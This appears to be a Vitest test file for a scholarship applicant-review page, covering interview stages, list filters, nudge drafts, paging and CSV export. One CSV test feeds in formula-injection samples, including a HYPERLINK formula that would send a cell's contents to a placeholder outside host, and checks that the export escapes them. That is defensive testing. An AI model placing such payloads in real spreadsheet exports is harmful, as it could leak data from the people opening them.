// The refreshed Applicants pages' pure logic (lib/applicants-map.ts): where an application is, the day words, the list
// filters, groups and sorts, the scoring bar, the nudge drafts, the CSV, the empty line, word counts and paging.
import { describe, expect, it } from 'vitest';
import {
  barParts,
  chunk,
  csvFor,
  emptyLine,
  initialsOf,
  inGroup,
  liveCaps,
  matches,
  mineToScore,
  nudgeFor,
  pageAll,
  pairWords,
  relDay,
  sortList,
  stageOf,
  whenText,
  words,
} from '@/lib/applicants-map';
import type { ApApplicant, ApCycle, ApPerson } from '@/lib/applicants-view';

const NOW = '2026-11-18T14:00:00.000Z'; // Wed Nov 18, 9:00 AM ET
const ME: ApPerson = { id: 'dm', name: 'Dana Mercer', first: 'Dana', initials: 'DM', me: true };
const KD: ApPerson = { id: 'kd', name: 'Keith Dawson', first: 'Keith', initials: 'KD', me: false };
const CYCLE: ApCycle = {
  term: 'Fall 2026',
  awardName: 'Legacy Scholarship',
  opensAt: '2026-10-12T16:00:00.000Z',
  criteriaTotal: 6,
  scoresDue: '2026-11-22',
  interviewEnd: '2026-11-20',
  selectionAt: '2026-11-25T00:00:00.000Z',
  awardOn: '2026-11-30',
};

function app(over: Partial<ApApplicant> = {}): ApApplicant {
  return {
    id: 'a1',
    code: 'APP-2026-00001',
    name: 'Jordan Smith',
    test: false,
    appliedAt: '2026-10-20T15:00:00.000Z',
    interviewAt: null,
    interviewMinutes: null,
    pair: [],
    published: [],
    draft: 0,
    avg: null,
    summary: null,
    email: null,
    phone: null,
    ...over,
  };
}

describe('stageOf', () => {
  it('not booked', () => {
    expect(stageOf(app(), NOW, 'dm')).toMatchObject({ kind: 'unbooked', now: 1, label: 'Interview not booked' });
  });
  it('a coming interview, the viewer\'s own says "Your interview"', () => {
    const later = app({ interviewAt: '2026-11-18T22:00:00.000Z', pair: [ME, KD] });
    expect(stageOf(later, NOW, 'dm')).toMatchObject({ kind: 'interview', you: true, label: 'Your interview today' });
    expect(stageOf(later, NOW, 'al')).toMatchObject({ kind: 'interview', you: false, label: 'Interview today' });
  });
  it('held: needs the viewer\'s score, waiting on the other, scored once both published', () => {
    const held = app({ interviewAt: '2026-11-16T22:00:00.000Z', pair: [ME, KD] });
    expect(stageOf(held, NOW, 'dm')).toMatchObject({ kind: 'needs', label: 'Needs your score', you: true });
    expect(stageOf({ ...held, published: ['dm'] }, NOW, 'dm')).toMatchObject({ kind: 'waiting', label: 'Waiting on Keith Dawson' });
    expect(stageOf(held, NOW, 'al')).toMatchObject({ kind: 'waiting', label: 'Waiting on both scores' });
    expect(stageOf({ ...held, published: ['dm', 'kd'] }, NOW, 'dm')).toMatchObject({ kind: 'scored', now: 3 });
  });
  it('a held interview with nobody paired waits on the pairing', () => {
    expect(stageOf(app({ interviewAt: '2026-11-16T22:00:00.000Z' }), NOW, 'dm')).toMatchObject({ kind: 'waiting', label: 'Interviewers not paired' });
  });
});

describe('day words', () => {
  it('relDay', () => {
    expect(relDay(NOW, '2026-11-18T23:00:00.000Z')).toBe('Today');
    expect(relDay(NOW, '2026-11-19T15:00:00.000Z')).toBe('Tomorrow');
    expect(relDay(NOW, '2026-11-17T15:00:00.000Z')).toBe('Yesterday');
    expect(relDay(NOW, '2026-11-21T15:00:00.000Z')).toBe('Sat');
    expect(relDay(NOW, '2026-11-05T15:00:00.000Z')).toMatch(/Nov 5/);
  });
  it('whenText keeps the clock only for coming or recent interviews', () => {
    expect(whenText(NOW, null)).toBe('Not booked');
    expect(whenText(NOW, '2026-11-18T22:00:00.000Z')).toBe('Today, 5:00 PM');
    expect(whenText(NOW, '2026-11-05T22:00:00.000Z')).not.toContain(',');
  });
  it('initials', () => {
    expect(initialsOf('Adaeze-Grace Nwachukwu-Bello')).toBe('AB');
    expect(initialsOf('')).toBe('?');
  });
});

describe('list filters, groups and sorts', () => {
  const a = app({ name: 'Jordan Smith', code: 'APP-2026-00007', pair: [ME, KD] });
  it('matches by tab, interviewer and name or code', () => {
    expect(matches(a, 'needs', { tab: 'needs', who: '', q: '' })).toBe(true);
    expect(matches(a, 'waiting', { tab: 'needs', who: '', q: '' })).toBe(true);
    expect(matches(a, 'scored', { tab: 'needs', who: '', q: '' })).toBe(false);
    expect(matches(a, 'unbooked', { tab: 'interview', who: '', q: '' })).toBe(true);
    expect(matches(a, 'needs', { tab: 'all', who: 'al', q: '' })).toBe(false);
    expect(matches(a, 'needs', { tab: 'all', who: 'kd', q: 'SMITH' })).toBe(true);
    expect(matches(a, 'needs', { tab: 'all', who: '', q: '00007' })).toBe(true);
    expect(matches(a, 'needs', { tab: 'all', who: '', q: 'zzz' })).toBe(false);
    expect(matches(app({ name: 'José Núñez' }), 'needs', { tab: 'all', who: '', q: 'jose nunez' })).toBe(true);
    expect(matches(app({ name: 'Jose Nunez' }), 'needs', { tab: 'all', who: '', q: 'José' })).toBe(true);
  });
  it('the needs group puts the most-drafted first, scored by average', () => {
    const st = stageOf(app({ interviewAt: '2026-11-16T22:00:00.000Z', pair: [ME, KD] }), NOW, 'dm');
    const rows = [
      { a: app({ id: 'x', draft: 1, interviewAt: '2026-11-16T22:00:00.000Z' }), st },
      { a: app({ id: 'y', draft: 4, interviewAt: '2026-11-17T22:00:00.000Z' }), st },
    ];
    expect(inGroup(rows, 'needs').map((r) => r.a.id)).toEqual(['y', 'x']);
    const sc = { ...st, kind: 'scored' as const };
    expect(inGroup([{ a: app({ id: 'p', avg: 3.2 }), st: sc }, { a: app({ id: 'q', avg: 4.6 }), st: sc }], 'scored').map((r) => r.a.id)).toEqual(['q', 'p']);
  });
  it('sortList by code and by newest application', () => {
    const rows = [{ a: app({ code: 'B', appliedAt: '2026-10-01T00:00:00Z' }) }, { a: app({ code: 'A', appliedAt: '2026-10-05T00:00:00Z' }) }];
    expect(sortList(rows, 'code').map((r) => r.a.code)).toEqual(['A', 'B']);
    expect(sortList(rows, 'applied').map((r) => r.a.code)).toEqual(['A', 'B']);
    expect(sortList(rows, 'attention')).toBe(rows);
  });
  it('mineToScore and pairWords', () => {
    const held = app({ interviewAt: '2026-11-16T22:00:00.000Z', pair: [KD, ME] });
    expect(mineToScore([held, app()], NOW, 'dm')).toHaveLength(1);
    expect(pairWords(held.pair)).toBe('You + Keith Dawson');
  });
});

describe('strip, nudges, CSV, empty line, words', () => {
  it('barParts caps at 50 segments', () => {
    expect(barParts(21, 6)).toEqual({ segs: 21, on: 6 });
    expect(barParts(141, 6)).toEqual({ segs: 50, on: 2 });
    expect(barParts(0, 0)).toEqual({ segs: 0, on: 0 });
  });
  it('nudge the open interviewers, remind an unbooked student, nothing otherwise', () => {
    const held = app({ interviewAt: '2026-11-16T22:00:00.000Z', pair: [ME, KD], published: ['dm'] });
    const n = nudgeFor(held, stageOf(held, NOW, 'dm'), CYCLE);
    expect(n?.label).toBe('Nudge Keith');
    expect(n?.text).toContain('Scores are due Sunday');
    const r = nudgeFor(app(), stageOf(app(), NOW, 'dm'), CYCLE);
    expect(r?.label).toBe('Remind Jordan');
    expect(r?.toWhere).toBe('by email');
    const scored = { ...held, published: ['dm', 'kd'] };
    expect(nudgeFor(scored, stageOf(scored, NOW, 'dm'), CYCLE)).toBeNull();
    expect(nudgeFor(held, stageOf(held, NOW, 'dm'), { ...CYCLE, scoresDue: null })?.text).not.toContain('due');
  });
  it('liveCaps: no nudges live, export for admins only', () => {
    expect(liveCaps(true)).toEqual({ nudge: false, export: true });
    expect(liveCaps(false)).toEqual({ nudge: false, export: false });
  });
  it('csvFor quotes every value', () => {
    const a = app({ name: 'Jo "JJ" Smith', email: 'jo@terpmail.umd.edu', test: true });
    const csv = csvFor([{ a, st: stageOf(a, NOW, 'dm') }]).split('\n');
    expect(csv[0]).toBe('Code,Name,Applied,Interview,Stage,Terpmail,Phone,Board test');
    expect(csv[1]).toContain('"Jo ""JJ"" Smith"');
    expect(csv[1]).toContain('"yes"');
  });
  it('csvFor turns formula-looking values into text with a leading apostrophe', () => {
    const cell = (name: string, phone = '') => {
      const a = app({ name, phone });
      return csvFor([{ a, st: stageOf(a, NOW, 'dm') }]).split('\n')[1];
    };
    expect(cell('=HYPERLINK("https://x.example/?"&F2,"Open")')).toContain(`"'=HYPERLINK(""https://x.example/?""&F2,""Open"")"`);
    expect(cell(' =1+1')).toContain(`"' =1+1"`);
    for (const bad of ['+SUM(A1)', '-2+3', '@cmd', '\t=1', '\r=1']) expect(cell(bad)).toContain(`"'${bad}"`);
    // A phone like "+1 301 555 0100" is prefixed too, so it reads as the same text instead of a number or formula.
    expect(cell('Jo Smith', '+1 301 555 0100')).toContain(`"'+1 301 555 0100"`);
    expect(cell('Jo Smith', '301-555-0100')).toContain('"Jo Smith"');
    expect(cell('Jo Smith', '301-555-0100')).toContain('"301-555-0100"');
  });
  it('emptyLine says open or opened', () => {
    expect(emptyLine(CYCLE, NOW)).toBe('No applicants yet. Applications opened Mon Oct 12.');
    expect(emptyLine({ ...CYCLE, opensAt: '2027-01-12T16:00:00.000Z' }, NOW)).toMatch(/Applications open /);
    expect(emptyLine({ ...CYCLE, opensAt: null }, NOW)).toBe('No applicants yet.');
  });
  it('words', () => {
    expect(words('  one two\nthree ')).toBe(3);
    expect(words('   ')).toBe(0);
  });
});

describe('paging', () => {
  it('pageAll reads until an empty page, even when the server caps each page at 500 rows', async () => {
    const data = Array.from({ length: 2300 }, (_, i) => i);
    const calls: number[] = [];
    const all = await pageAll(async (from, to) => {
      calls.push(from);
      return data.slice(from, Math.min(to + 1, from + 500));
    });
    expect(all).toEqual(data);
    expect(calls).toEqual([0, 500, 1000, 1500, 2000, 2300]);
  });
  it('pageAll stops on an empty page and throws on a runaway read', async () => {
    expect(await pageAll(async () => [])).toEqual([]);
    await expect(pageAll(async (f, t) => Array.from({ length: t - f + 1 }, () => 1), 10, 25)).rejects.toThrow();
  });
  it('chunk', () => {
    expect(chunk(Array.from({ length: 250 }, (_, i) => i)).map((c) => c.length)).toEqual([100, 100, 50]);
    expect(chunk([])).toEqual([]);
  });
});
